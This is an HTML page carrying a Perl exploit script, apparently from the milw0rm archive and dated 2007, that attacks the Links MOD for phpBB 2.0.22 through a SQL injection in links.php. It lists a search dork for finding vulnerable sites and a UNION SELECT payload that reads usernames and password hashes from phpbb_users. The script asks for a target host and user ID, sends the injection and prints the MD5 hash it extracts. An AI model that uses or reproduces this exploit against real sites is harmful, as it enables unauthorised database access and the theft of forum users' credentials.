<html><head><title>phpBB Links MOD 1.2.2 Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl

print q{

phpBB &lt;= 2.0.22 - Links MOD &lt;= v1.2.2 Remote SQL Injection Exploit

Bug discovered by Don
Dork: allinurl:links.php?t=search
   or: &quot;Links MOD v1.2.2 by phpBB2.de&quot;
SQL INJECTION: Exploit: links.php?t=search&amp;search_keywords=asd&amp;start=1,1%20UNION%20SELECT%201,username,user_password,4,5,6,7,8,9,10,11,12%20FROM%20phpbb_users%20WHERE%20user_id=2/*

};

use IO::Socket;

print q{
=&gt; Insert URL
=&gt; without ( http )
=&gt; };
$server = &lt;STDIN&gt;;
chop ($server);
print q{
=&gt; Insert directory
=&gt; es: /forum/ - /phpBB2/
=&gt; };
$dir = &lt;STDIN&gt;;
chop ($dir);
print q{
=&gt; User ID
=&gt; Number:
=&gt; };
$user = &lt;STDIN&gt;;
chop ($user);
if (!$ARGV[2]) {
}
$myuser = $ARGV[3];
$mypass = $ARGV[4];
$myid = $ARGV[5];
$server =~ s/(http:\/\/)//eg;
$path = $dir;
$path .= &quot;links.php?t=search&amp;search_keywords=asd&amp;start=1,1%20UNION%20SELECT%201,username,user_password,4,5,6,7,8,9,10,11,12%20FROM%20phpbb_users%20WHERE%20user_id=&quot;.$user.&quot;/*&quot;;
print &quot;
Exploit in process...\r\n&quot;;
$socket = IO::Socket::INET-&gt;new(
Proto =&gt; &quot;tcp&quot;,
PeerAddr =&gt; &quot;$server&quot;,
PeerPort =&gt; &quot;80&quot;) || die &quot;Exploit failed&quot;;
print &quot;Exploit\r\n&quot;;
print &quot;in process...\r\n&quot;;
print $socket &quot;GET $path HTTP/1.1\r\n&quot;;
print $socket &quot;Host: $server\r\n&quot;;
print $socket &quot;Accept: */*\r\n&quot;;
print $socket &quot;Connection: close\r\n\r\n&quot;;
print &quot;Exploit finished!\r\n\r\n&quot;;
while ($answer = &lt;$socket&gt;)
{
if ($answer =~/(\w{32})/)
{
if ($1 ne 0) {
print &quot;MD5-Hash is: &quot;.$1.&quot;\r\n&quot;;
}
exit();
}
}

# milw0rm.com [2007-08-31]</pre></html>